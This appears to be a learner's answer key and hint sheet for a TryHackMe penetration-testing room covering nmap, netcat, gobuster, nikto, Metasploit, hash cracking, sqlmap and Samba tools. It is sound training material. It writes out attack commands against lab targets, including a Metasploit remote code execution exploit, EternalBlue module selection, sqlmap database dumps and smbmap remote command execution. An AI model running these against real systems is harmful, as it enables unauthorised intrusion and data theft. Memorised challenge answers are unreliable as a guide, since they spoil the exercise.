#### Link to room: https://tryhackme.com/room/ccpentesting 

#### Table of Contents
* [[Task 1] Introduction](#task-1)
* [[Task 2] Section 1 - Network Utilities: Nmap](#task-2)
* [[Task 3] Section 1 - Network Utilities: Netcat](#task-3)
* [[Task 4] Section 2 - Web Enumeration: Gobuster](#task-4)
* [[Task 5] Section 2 - Web Enumeration: Nikto](#task-5) 
* [[Task 6] Section 3 - Metasploit: Intro](#task-6) 
* [[Task 7] Section 3 - Metasploit: Setting up](#task-7) 
* [[Task 8] Section 3 - Metasploit: Selecting a module](#task-8)
* [[Task 9] Section 3 - Metasploit: Meterpreter](#task-9)
* [[Task 10] Section 3 - Metasploit: Final Walkthrough](#task-10)
* [[Task 11] Section 4 - Hash Cracking: Intro](#task-11)  
* [[Task 12] Section 4 - Hash Cracking: Salting and Formatting](#task-12)
* [[Task 13] Section 4 - Hash Cracking: hashcat](#task-13)
* [[Task 14] Section 4 - Hash Cracking: John the Ripper](#task-14)
* [[Task 15] Section 5 - SQL Injection: Intro](#task-15) 
* [[Task 16] Section 5 - SQL Injection: sqlmap](#task-16) 
* [[Task 17] Section 5 - SQL Injection: A note on manual SQL Injection](#task-17)
* [[Task 18] Section 5 - SQL Injection: Vulnerable Web Application](#task-18) 
* [[Task 19] Section 6 - Samba: Intro](#task-19)
* [[Task 20] Section 6 - Samba: smbmap](#task-20)
* [[Task 21] Section 6 - Samba: smbclient](#task-21)
* [[Task 22] Section 6 - Samba: A note about impacket](#task-22)
* [[Task 23] Misc: A note on privilege escalation](#task-23)
* [[Task 24] Section 7 - Final Exam: Good Luck :D](#task-24) 

#### [Task 1] Introduction <a name="task-1"></a>
   1. No answer needed 
   
#### [Task 2] Section 1 - Network Utilities: Nmap <a name="task-2"></a>
   1. network mapper 
   2. -p 
> Hint:
>
> After typing in the command "man nmap" into a terminal 
>
> You should be able to see: -p <port ranges>: Only scan specified ports
   3. -sn 
> Hint: 
>
> After typing in the command "man nmap" into a terminal 
>
> You should be able to see: -sn: Ping Scan - disable port scan
   4. -su 
> Hint: 
>
> After typing in the command "man nmap" into a terminal 
>
> You should be able to see: -sU: UDP Scan
   5. -sc 
> Hint: 
>
> After typing in the command "man nmap" into a terminal 
>
> You should be able to see: -sC: equivalent to --script=default
   6. -a 
> Hint: 
>
> After typing in the command "man nmap" into a terminal 
>
> You should be able to see: -A: Enable OS detection, version detection, script scanning, and traceroute
   7. -o 
> Hint: 
>
> After typing in the command "man nmap" into a terminal 
>
> You should be able to see: -O: Enable OS detection
   8. -sv 
> Hint: 
>
> After typing in the command "man nmap" into a terminal 
>
> You should be able to see: -sV: Probe open ports to determine service/version info
   9. No answer needed 
   10. 1
> Hint:
>
> Type in the command "nmap -A <YOUR IP ADDRESS>
>
> The "-A" will enable OS detection, version detection, script scanning, and tracerout
>
> The output of the scan will show only 1 port open; 80/tcp  
   11. Apache
> Hint: 
>
> In the scan output, you should see something along the line of "80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))"
>
> The service being the Apache server
   12. 2.4.18
> Hint: 
>
> In the scan output, you should see something along the line of "80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))"
>
> The version being the "2.4.18"
   13. Apache2 Ubuntu Default Page: It works
> Hint: 
>
> In the scan output, you should see something along the line of "|_http-title: Apache2 Ubuntu Default Page: It works"

#### [Task 3] Section 1 - Network Utilities: Netcat <a name="task-3"></a>
   1. -l 
> Hint:
>
> After typing "man nc" into a terminal, you should be able to see "-l | listen mode, for inbound connects"
   2. -v 
> Hint:
>
> After typing "man nc" into a terminal, you should be able to see "-v | verbose [use twice to be more verbose]"
   3. -p 
> Hint:
>
> After typing "man nc" into a terminal, you should be able to see "-p port | local port number (port numbers can be individual or ranges: lo-hi [inclusive])"
   4. -e 
> Hint:
>
> After typing "man nc" into a terminal, you should be able to see "-e filename | specify filename to exec after connect (use with caution)"
   5. -u
> Hint:
>
> After typing "man nc" into a terminal, you should be able to see "-u | UDP mode"

#### [Task 4] Section 2 - Web Enumeration: Gobuster <a name="task-4"></a>

Hint: you can install gobuster with the "apt-get install gobuster"

When you type "gobuster --help", you will get a small amount of output 

However under the "usage" title, you can see that the commands are actually "gobuster [command]"

Therefore you should use the syntax "gobuster dir", "gobuster host", etc for further flags to add 

More information about the flags can be found [here](https://github.com/OJ/gobuster)

   1. dir
> Hint: 
>
> After typing "gobuster --help" into terminal, you should be able to see "dir | Uses directory/file brutceforcing mode" 
   2. dns
> Hint: 
>
> After typing "gobuster --help" into terminal, you should be able to see "dns | Uses DNS subdomain bruteforcing mode" 
   3. -x 
>Hint:
>
> After typing "gobuster dir --help" into terminal, you should be able to see:
>
> -x, --extensions string | File extension(s) to search for 
   4. -w 
> Hint: 
>
> After typing "gobuster dir --help" into terminal, you should be able to see 
>
> "-w, --wordlist string | Path to the wordlist"
   5. -U
> Hint:
>
> After typing "gobuster dir --help" into terminal, you should be able to see:
>
> "-U, --username string | Username for Basic Auth"  
   6. -P
> Hint:
>
> After typing "gobuster dir --help" into terminal, you should be able to see:
>
> "-P, --password string | Password for Basic Auth"  
   7. -s 
> Hint:
>
> After typing "gobuster dir --help" into terminal, you should be able to see:
>
> "-s, --statuscodes string | Positive status codes (will be overwritten with statuscodesblacklist if set) (default "200,204,301,302,307,401,403")"
   8. -k
> Hint:
>
> After typing "gobuster dir --help" into terminal, you should be able to see:
>
> "-k, --insecuressl | Skip SSL certificate verification"  
   9. -a 
> Hint:
>
> After typing "gobuster dir --help" into terminal, you should be able to see:
>
> "-a, --useragent string | Set the User-Agent string (default "gobuster/3.0.1")"
   10. -h 
> Hint:
>
> After typing "gobuster dir --help" into terminal, you should be able to see:
>
> "-H, --headers stringArray | Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2"  
   11. -u 
> Hint:
>
> After typing "gobuster dir --help" into terminal, you should be able to see:
>
> "-u, --url string | The target URL"
   12. No answer needed 
   13. secret
> Hint:
> 
> If you have dirbuster installed (you are on kali linux), you can enter the following command: 
>
> gobuster dir -u http://<YOUR IP ADDRESS> -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x xxa 
>
> The output in the console should show something similar to "/secret (Status: 301)"
   14. password
> Hint:
>
> Using the same command as above, you should be able to see something along the line of "/password.xxa (Status: 200)"
>
> The "-x xxa" is a switch that will search for files that end with the extension .xxa

#### [Task 5] Section 2 - Web Enumeration: Nikto <a name="task-5"></a>
   1. -h 
> Hint:
>
> After typing "man nikto" into terminal, it is possible to see "-host | Host(s) to target. Can be an IP address, hostname or text file of hosts"
>
> Although not eaxctly visible, we can assume that -h might be used for hosts 
   2. -nossl
> Hint:
>
> After typing "man nikto" into terminal, it is possible to see "-nossl | Do not use SSL to connect to the server"
   3. -ssl 
> Hint:
>
> After typing "man nikto" into terminal, it is possible to see "-ssl | Only test SSL on the ports specified"
   4. id 
> Hint:
>
> After typing "man nikto" into terminal, it is possible to see "-id | ID and password to use for host Basic host authentication."
   5. -plugins
> Hint:
>
> After typing "man nikto" into terminal, it is possible to see "-plugins | Select which plugins will be run on the specified targets" 
   6. apacheusers
> Hint: 
> 
> Navigate to https://github.com/sullo/nikto/wiki/Plugin-list
>
> If you search for apache you should be able to see "Apache Users - Checks whether we can enumerate usernames directly from the web server"
   7. -update
> Hint:
>
> After typing "man nikto" into terminal, it is possible to see "-update | Update databases and plugins from CIRT.net" 
   8. -list-plugins
> Hint:
>
> After typing "man nikto" into terminal, it is possible to see "-list-plugins | List all available plugins" 

#### [Task 6] Section 3 - Metasploit: Intro <a name="task-6"></a>

   1. No answer needed

#### [Task 7] Section 3 - Metasploit: Setting up <a name="task-7"></a>

Hint: For me, instead of "msf5", I entered the command "msfconsole" to open the metasploit console

   1. search 
> Hint:
>
> Once in the "msf5" console, if you type the command "help" 
>
> In the output you should be able to see: "search | Searches module names and descriptions"
   2. use 
> Hint: 
>
> Once in the "msf5" console, if you type the command "help" 
>
> In the output you should be able to see: "use | Interact with a module by name or search term/index"
   3. info 
> Hint: 
>
> Once in the "msf5" console, if you type the command "help" 
>
> In the output you should be able to see: "info | Displays information about one or more modules"
   4. options
> Hint: 
>
> Once in the "msf5" console, if you type the command "help" 
>
> In the output you should be able to see: "options | Displays global options or for one or more modules"
   5. advanced
> Hint: 
>
> Once in the "msf5" console, if you type the command "help" 
>
> In the output you should be able to see: "advanced | Displays advanced options for one or more modules"
   6. show 
> Hint: 
>
> Once in the "msf5" console, if you type the command "help" 
>
> In the output you should be able to see: "show | Displays modules of a given type, or all modules"  


#### [Task 8] Section 3 - Metasploit: Selecting a module <a name="task-8"></a>
   1. use exploit/windows/smb/ms17_010_eternalblue
> Hint: 
>
> Once in the "msf5" console, type the command "search eternalblue" 
>
> In the console output, you should be able to see a few modules
>
> The one we are looking for should look like "exploit/windows/smb/ms17_010_eternalblue"
>
> In order to select it for use, we have to preface the command with "use"
   2. rhosts
> Hint:
>
> If you type "show options" into the console, you will see a large output 
>
> You will be able to see "RHOSTS | The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'"
   3. rport
> Hint: 
>
> If you type "show options" into the console, you will see a large output 
>
> You will be able to see "RPORT | The target port (TCP)"
   4. set 
> Hint: 
>
> Once in the "msf5" console, if you type the command "help" 
>
> In the output you should be able to see: "set | Sets a context-specific variable to a value"
   5. set SMBPass username
> Hint:
>
> If you type "show options" into the console, you will see a large output 
>
> You will be able to see "SMBPass | (Optional) The password for the specified username"
   6. set SMBUser password
> Hint:
>
> If you type "show options" into the console, you will see a large output 
>
> You will be able to see "SMBUser | (Optional) The username to authenticate as"
   7. arch 
> Hint:
>
> If you type "show options" into the console, you will see a large output 
>
> You will be able to see "VERIFY_ARCH | Check if remote architecture matches exploit Target."
>
> Seeing that the answer wants a 4 letter word, it would be safe to assume the answer would just be "arch"
   8. payload
> Hint: 
>
> If you type "set" into the console, you will see a large output 
>
> You will be able to see something called "PAYLOAD" which stands for the payload 
>
> By typing in "set PAYLOAD", we will be able to select the payload you want to use
   9. exploit
> Hint: 
>
> Once in the "msf5" console, if you type the command "help" 
>
> In the output you should be able to see: "exploit | Launch an exploit attempt"
   10. -j 
> Hint: 
>
> By typing in the command "exploit help" 
>
> You should be able to see: "-j  | Run in the context of a job"
>
> That to me doesn't make any sense, so found an example [here](https://www.offensive-security.com/metasploit-unleashed/exploits/)
   11. sessions
> Hint: 
>
> Once in the "msf5" console, if you type the command "help" 
>
> In the output you should be able to see: "sessions | Dump session listings and display information about sessions" 
   12. -i 
> Hint: 
>
> By typing in the command "sessions -h"
>
> You should be able to see "-i <opt>  Interact with the supplied session ID"


#### [Task 9] Section 3 - Metasploit: Meterpreter <a name="task-9"></a>

Hint: All answers for this task can be found [here](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)

   1. download
   2. upload
   3. ps
   4. migrate
   5. ls
   6. execute
   7. shell
   8. search
   9. cat
   10. background

#### [Task 10] Section 3 - Metasploit: Final Walkthrough <a name="task-10"></a>

   1. use exploit/multi/http/nostromo_code_exec
> Hint: 
>
> In order to use the module for exploitation, we have to type the command "use"
   2. rhosts
 Hint:
>
> If you type "show options" into the console, you will see a large output 
>
> You will be able to see "RHOSTS | The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'"
>
> Dont forget to actually set the rhosts to with "set rhosts <GIVEN-IP-ADDRESS>"
   3. set rport 80 
> Hint: 
>
> If you type "show options" into the console, you will see a large output 
>
> You will be able to see "RPORT | The target port (TCP)"
>
> By including the command "set" at the beginning we can assign the value "80" to the remote port
   4. lhost 
> Hint: 
>
> If you type "show options" into the console, you will see a large output 
>
> You will be able to see "LHOST | The listen address (an interface may be specified)"
>
> Dont forget to actually set the lhost to with "set lhost <INTERNAL-VIRTUAL-IP-ADDRESS>"
>
> The <INTERNAL-VIRTUAL-IP-ADDRESS> can be find in the "Access" page on the TryHackMe website 
>
> The access page can be found in the sidebar above leaderboards
   5. No answer needed 
> Hint: 
>
> Type the command "run" to start the exploit
   6. s3cretd1r
> Hint: 
>
> Once you run the command, you will see that a command shell session has opened
>
> It will seem like the console is waiting since it just becomes an empty space 
>
> However you are able to tpye commands into it
>
> But it seems like it is not a fully functional command line and will only take one command at a time and then resets 
>
> Therefore to see the contents of that directory, type "ls -la /var/nostromo/htdocs"
   7. Woohoo!
> Hint: 
> 
> To find the contents of the file we need to see the contents of the "s3cretd1r" directory first 
>
> By typing in the command "ls -la /var/nostromo/htdocs/s3cretd1r"
>
> We see that there is a file called "nice" 
>
> Therefore to see the contents of that file, we type "cat var/nostromo/htdocs/s3cretd1r/nice"


#### [Task 11] Section 4 - Hash Cracking: Intro  <a name="task-11"></a>
   1. No answer needed 


#### [Task 12] Section 4 - Hash Cracking: Salting and Formatting <a name="task-12"></a>
   1. No answer needed 

#### [Task 13] Section 4 - Hash Cracking: hashcat <a name="task-13"></a>
   1. -m 
> Hint:
>
> After typing in the command "hashcat --help", you should be able to see "-m, --hash-type | Hash-type, see references below"
   2. -a 
> Hint:
>
> After typing in the command "hashcat --help", you should be able to see: "-a, --attack-mode | Attack-mode"     
   3. 3 
> Hint:
>
> After typing in the command "hashcat --help", you should be able to see: " 3 | Brute-force" 
   4. 17600 
> Hint:
>
> Due to the numbers not being ordered, search [here](https://hashcat.net/wiki/doku.php?id=example_hashes)
   5. happy 
> Hint:
>
> First create a text file with the hash in it; "echo "56ab24c15b72a457069c5ea42fcfc640" > hash.txt"
>
> Then we can crack the hash with this command:
>
> "hashcat -m 0 -a 0 -o crack.txt hash.txt /usr/share/wordlists/rockyou.txt"
>
> -m represents the mode for MDS
>
> -a represents using a dictionary attack to try and crack the hash against
>
> -o presents outputting the answer to a new file called "crack.txt" 
>
> hash.txt representing where our hash is located
>
> the end directories represent the location of our wordlist 
>
> EDIT:
>
> You might get an error about "Not a native Intel OpenCL runtime", just add "--force" at the end of the command
>
> "hashcat -m 0 -a 0 56ab24c15b72a457069c5ea42fcfc640 /usr/share/wordlists/rockyou.txt --force" should be a simpler way of doing it
>
> More info can be found [here](https://resources.infosecinstitute.com/hashcat-tutorial-beginners/#gref)
   6. nootnoot
> Hint: 
>
> The same format can be used however instead of "-m 0" use "-m 900" for MD4 instead. 


#### [Task 14] Section 4 - Hash Cracking: John the Ripper <a name="task-14"></a>
   1. --wordlist
> Hint: 
>
> After typing in the command "john --help", you should be able to see "--wordlist[=FILE] --stdin | wordlist mode, read words from FILE or stdin"
   2. --format  
> Hint: 
>
> After typing in the command "john --help", you should be able to see "--format=NAME | force hash of type NAME."
   3. --rules 
> Hint: 
>
> After typing in the command "john --help", you should be able to see "--rules[=SECTION[,..]] | enable word mangling rules"
   4. hello 
> Hint: 
>
> First create a text file with the hash in it; "echo "5d41402abc4b2a76b9719d911017c592" > hash.txt"
>
> Since the hash is MD5 then we need to use a MD5 hash cracker
>
> By typing in the command "john --list=formats", you should be able to see "raw-md5" (there are other similar types be aware)
>
> By typing in this command "john --format=Raw-MD5 --wordlist /usr/share/wordlists/rockyou.txt hash.txt"
>
> the directories represent the location of our wordlist 
>
> then end with the name of file with the hash in it
>
> You should then see an output similar to this: "hello (?)"
   5. password
> Hint: 
>
> You should be able to use the same format as the question above
>
> Be sure to change the format to "--format=RAW-SHA1" 

#### [Task 15] Section 5 - SQL Injection: Intro <a name="task-15"></a>
   1. No answer needed 

#### [Task 16] Section 5 - SQL Injection: sqlmap <a name="task-16"></a>

Hint: All answers for this task can be found after you type the command "sqlmap -hh" into terminal

   1. -u
> Hint: 
>
> You should be able to see: "-u URL, --url=URL   Target URL"
   2. -g
> Hint: 
>
> You should be able to see: "-g GOOGLEDORK | Process Google dork results as target URLs"
   3. -p
> Hint: 
>
> You should be able to see: "-p TESTPARAMETER | Testable parameter(s)"
   4. --dmds
> Hint: 
>
> You should be able to see: "--dbms=DBMS | Force back-end DBMS to provided value"
   5. --level
> Hint: 
>
> You should be able to see: "--level=LEVEL | Level of tests to perform (1-5, default 1)"
   6. --dump
> Hint: 
>
> You should be able to see: "--dump | Dump DBMS database table entries"
   7. -D
> Hint: 
>
> You should be able to see: "-D DB | DBMS database to enumerate"
   8. -T
> Hint: 
>
> You should be able to see: "-T TBL | DBMS database table(s) to enumerate"
   9. -C
> Hint: 
>
> You should be able to see: "-C COL | DBMS database table column(s) to enumerate"
   10. --os-shell
> Hint: 
>
> You should be able to see: "--os-shell | Prompt for an interactive operating system shell"
   11. --dump-all
> Hint: 
>
> You should be able to see: "-dump-all | Dump all DBMS databases tables entries"
   12. No answer needed


#### [Task 17] Section 5 - SQL Injection: A note on manual SQL Injection <a name="task-17"></a>
   1. No answer needed 

#### [Task 18] Section 5 - SQL Injection: Vulnerable Web Application <a name="task-18"></a>
   1. No answer needed
> Hint:
>
> In the terminal, run the following command: "sqlmap -u <GIVE-IP-ADDRESS>" 
>
> You might be asked to the additional "--forms" flag, if so add the flag to the end of your command
>
> When running the command, you will be asked a few questions, if you respond yes or press enter to leave it blank to all of them then the command should run successfully
   2. 3 
> Hint: 
>
> Once the command has finished, you should see something along the lines of:
>
> "sqlmap resumed the following injection point(s) from stored session:"
>
> Under this sentence will be the amount of injection points available, in this case there are 3x types
   3. No answer needed
> Hint: 
>
> In the terminal run the following command "sqlmap -u <GIVE-IP-ADDRESS> --dump"
>
> You might be asked to the additional "--forms" flag, if so add the flag to the end of your command
>
> When running the command, you will be asked a few questions, if you respond yes or press enter to leave it blank to all of them then the command should run successfully 
   4. tests
> Hint: 
>
> After inputting the Q3 command, you should see some console output
>
> In the output, this should be visible: "Database: tests"
>
> This is the name of the database
   5. 2
> Hint: 
>
> After inputting the Q3 command, you should see some console output
>
> In the output, both these should be visible: "Table:lol" and "Table: msg"
>
> This shows that there are 2 tables
   6. found_me
> Hint: 
>
> After inputting the Q3 command, you should see some console output
>
> In the output, the title "flag" should be visible under the "lol" table. 
>
> Under the "flag" title is the content aka "found_me"

#### [Task 19] Section 6 - Samba: Intro <a name="task-19"></a>
   1. No answer needed

#### [Task 20] Section 6 - Samba: smbmap <a name="task-20"></a>

Hint: The answers for task 20 can be found after typing "smbmap -h" into the terminal

   1. -u
> Hint: 
>
> You should be able to see: "-u USERNAME | Username, if omitted null session assumed"
   2. -p
> Hint: 
>
> You should be able to see: "-p PASSWORD | Password or NTLM hash"
   3. -H
> Hint: 
>
> You should be able to see: "-H HOST | IP of host"
   4. -x
> Hint: 
>
> You should be able to see: "-x COMMAND | Execute a command ex. 'ipconfig /all'"
   5. -s
> Hint: 
>
> You should be able to see: "-s SHARE | Specify a share (default C$), ex 'C$'"
   6. -d
> Hint: 
>
> You should be able to see: "-d DOMAIN | Domain name (default WORKGROUP)"
   7. --download
> Hint: 
>
> You should be able to see: "--download PATH | Download a file from the remote system"
   8. --upload
> Hint: 
>
> You should be able to see: "--upload SRC DST | Upload a file to the remote system"
   9. smbmap -u "admin" -p "password" -H 10.10.10.10 -x "ipconfig"
> Hint
>
> All information is supplied from the previous questions above
>
> Make sure to add the quote marks for the phrases like it is shown in the description of the question

#### [Task 21] Section 6 - Samba: smbclient <a name="task-21"></a>

Hint: The answers for task 22 can be found after typing "smbclient --help" into the terminal

   1. -w
> Hint: 
>
> You should be able to see: "-W, --workgroup=WORKGROUP | Set the workgroup name"
   2. -I
> Hint: 
>
> You should be able to see: "-I, --ip-address=IP | Use this IP to connect to"
   3. -c "ipconfig"
> Hint: 
>
> You should be able to see: "-c, --command=STRING | Execute semicolon separated commands"
>
> The ipconfig would then follow the "-c" flag
   4. -U
> Hint: 
>
> You should be able to see: "-U, --user=USERNAME | Set the network username"
   5. -P
> Hint: 
>
> You should be able to see: "-P, --machine-pass | Use stored machine account password"
   6. -N
> Hint: 
>
> You should be able to see: "-N, --no-pass | Don't ask for a password"
   7. get test
> Hint:

> More information about these types of operations can be found [here](https://www.computerhope.com/unix/smbclien.htm)
   8. put /etc/hosts
> Hint:

> More information about these types of operations can be found [here](https://www.computerhope.com/unix/smbclien.htm)

#### [Task 22] Section 6 - Samba: A note about impacket <a name="task-22"></a>
   1. No answer needed 

#### [Task 23] Misc: A note on privilege escalation <a name="task-23"></a>
   1. No answer needed

#### [Task 24] Section 7 - Final Exam: Good Luck :D <a name="task-24"></a>
   1. 
   2. 
